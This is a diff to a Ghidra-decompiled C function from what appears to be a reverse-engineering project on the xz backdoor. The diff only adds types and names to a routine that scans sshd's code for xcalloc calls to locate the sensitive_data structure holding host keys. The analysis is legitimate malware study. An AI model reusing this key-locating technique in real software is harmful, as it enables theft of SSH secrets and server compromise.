@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103680_sshd_get_sensitive_data_address_via_xcalloc.c
 // Function: sshd_get_sensitive_data_address_via_xcalloc @ 0x103680
-// Calling convention: unknown
-// Prototype: undefined sshd_get_sensitive_data_address_via_xcalloc(void)
+// Calling convention: __stdcall
+// Prototype: BOOL __stdcall sshd_get_sensitive_data_address_via_xcalloc(u8 * data_start, u8 * data_end, u8 * code_start, u8 * code_end, string_references_t * string_refs, void * * sensitive_data_out)
 
 
 /*
@@ -14,116 +14,120 @@
 #include "xzre_types.h"
 
 
-undefined8
-sshd_get_sensitive_data_address_via_xcalloc
-          (ulong param_1,ulong param_2,ulong param_3,ulong param_4,long param_5,ulong *param_6)
+BOOL sshd_get_sensitive_data_address_via_xcalloc
+               (u8 *data_start,u8 *data_end,u8 *code_start,u8 *code_end,
+               string_references_t *string_refs,void **sensitive_data_out)
 
 {
+  u8 *call_target;
   byte bVar1;
-  int iVar2;
+  BOOL BVar2;
   long lVar3;
   long lVar4;
   long lVar5;
-  ulong *puVar6;
-  long *plVar7;
-  ulong uVar8;
+  long *plVar6;
+  undefined4 *puVar7;
+  u8 *puVar8;
   ulong uVar9;
   byte bVar10;
-  byte bVar11;
+  undefined1 uVar11;
+  dasm_ctx_t insn_ctx;
   long store_hits [16];
-  long local_100;
-  long local_f8;
-  ushort local_f0;
-  char local_e5;
+  u8 *xcalloc_call_target;
+  undefined1 local_100 [27];
+  u8 hit_count;
   undefined4 local_e4;
   byte local_e0;
-  ulong local_d0;
-  ulong local_a8 [16];
+  u8 *local_d0;
+  long local_a8 [16];
   
-  *param_6 = 0;
-  lVar4 = *(long *)(param_5 + 8);
-  if (lVar4 == 0) {
-    return 0;
+  *sensitive_data_out = (void *)0x0;
+  call_target = (u8 *)string_refs->entries[0].func_start;
+  if (call_target == (u8 *)0x0) {
+    return FALSE;
   }
-  bVar11 = 0xff;
-  uVar8 = 0;
+  uVar11 = 0xff;
+  puVar8 = (u8 *)0x0;
   bVar10 = 0;
-  puVar6 = local_a8;
+  plVar6 = local_a8;
   for (lVar3 = 0x20; lVar3 != 0; lVar3 = lVar3 + -1) {
-    *(undefined4 *)puVar6 = 0;
-    puVar6 = (ulong *)((long)puVar6 + 4);
+    *(undefined4 *)plVar6 = 0;
+    plVar6 = (long *)((long)plVar6 + 4);
   }
-  plVar7 = &local_100;
+  puVar7 = (undefined4 *)local_100;
   for (lVar3 = 0x16; lVar3 != 0; lVar3 = lVar3 + -1) {
-    *(undefined4 *)plVar7 = 0;
-    plVar7 = (long *)((long)plVar7 + 4);
+    *puVar7 = 0;
+    puVar7 = puVar7 + 1;
   }
 LAB_001036eb:
   do {
-    if ((param_4 <= param_3) || (iVar2 = find_call_instruction(param_3,param_4,lVar4), iVar2 == 0))
-    goto LAB_00103802;
-    param_3 = local_f8 + local_100;
-    iVar2 = find_instruction_with_mem_operand_ex(param_3,param_3 + 0x20,&local_100,0x109,0);
-  } while (iVar2 == 0);
-  if ((local_f0 & 0x1040) == 0) {
+    if ((code_end <= code_start) ||
+       (BVar2 = find_call_instruction(code_start,code_end,call_target,(dasm_ctx_t *)local_100),
+       BVar2 == FALSE)) goto LAB_00103802;
+    code_start = (u8 *)(local_100._0_8_ + local_100._8_8_);
+    BVar2 = find_instruction_with_mem_operand_ex
+                      (code_start,code_start + 0x20,(dasm_ctx_t *)local_100,0x109,(void *)0x0);
+  } while (BVar2 == FALSE);
+  if ((local_100._16_2_ & 0x1040) == 0) {
 LAB_00103788:
-    if (bVar11 != 0) {
-      param_3 = local_f8 + local_100;
+    if (uVar11 != 0) {
+      code_start = (u8 *)(local_100._0_8_ + local_100._8_8_);
       goto LAB_001036eb;
     }
   }
   else {
-    if ((local_f0 & 0x40) != 0) {
-      bVar11 = local_e4._2_1_;
-      if ((local_f0 & 0x20) != 0) {
-        bVar1 = local_e5 * '\x02';
+    if ((local_100._16_2_ & 0x40) != 0) {
+      uVar11 = local_e4._2_1_;
+      if ((local_100._16_2_ & 0x20) != 0) {
+        bVar1 = hit_count * '\x02';
 LAB_00103782:
-        bVar11 = bVar11 | bVar1 & 8;
+        uVar11 = uVar11 | bVar1 & 8;
       }
       goto LAB_00103788;
     }
-    if ((local_f0 & 0x1000) != 0) {
-      bVar11 = local_e0;
-      if ((local_f0 & 0x20) != 0) {
-        bVar1 = local_e5 << 3;
+    if ((local_100._16_2_ & 0x1000) != 0) {
+      uVar11 = local_e0;
+      if ((local_100._16_2_ & 0x20) != 0) {
+        bVar1 = hit_count << 3;
         goto LAB_00103782;
       }
       goto LAB_00103788;
     }
   }
-  if (((local_f0 & 0x100) != 0) && (uVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)) {
-    uVar8 = local_d0 + local_100 + local_f8;
+  if (((local_100._16_2_ & 0x100) != 0) && (puVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)
+     ) {
+    puVar8 = local_d0 + local_100._0_8_ + local_100._8_8_;
   }
-  if ((param_1 <= uVar8) && (uVar8 < param_2)) {
+  if ((data_start <= puVar8) && (puVar8 < data_end)) {
     uVar9 = (ulong)bVar10;
     bVar10 = bVar10 + 1;
-    local_a8[uVar9] = uVar8;
+    local_a8[uVar9] = (long)puVar8;
     if (0xf < bVar10) {
 LAB_00103802:
-      lVar4 = 0;
+      lVar3 = 0;
       do {
-        if ((uint)bVar10 <= (uint)lVar4) {
-          return 0;
+        if ((uint)bVar10 <= (uint)lVar3) {
+          return FALSE;
         }
-        lVar3 = 0;
+        lVar4 = 0;
         do {
           lVar5 = 0;
           do {
-            if ((local_a8[lVar4] == local_a8[lVar3] - 8) && (local_a8[lVar3] == local_a8[lVar5] - 8)
-               ) {
-              *param_6 = local_a8[lVar4];
-              return 1;
+            if (((void *)local_a8[lVar3] == (void *)(local_a8[lVar4] + -8)) &&
+               (local_a8[lVar4] == local_a8[lVar5] + -8)) {
+              *sensitive_data_out = (void *)local_a8[lVar3];
+              return TRUE;
             }
             lVar5 = lVar5 + 1;
           } while ((uint)lVar5 < (uint)bVar10);
-          lVar3 = lVar3 + 1;
-        } while ((uint)lVar3 < (uint)bVar10);
-        lVar4 = lVar4 + 1;
+          lVar4 = lVar4 + 1;
+        } while ((uint)lVar4 < (uint)bVar10);
+        lVar3 = lVar3 + 1;
       } while( TRUE );
     }
   }
-  bVar11 = 0;
-  param_3 = local_f8 + local_100;
+  uVar11 = 0;
+  code_start = (u8 *)(local_100._0_8_ + local_100._8_8_);
   goto LAB_001036eb;
 }
 
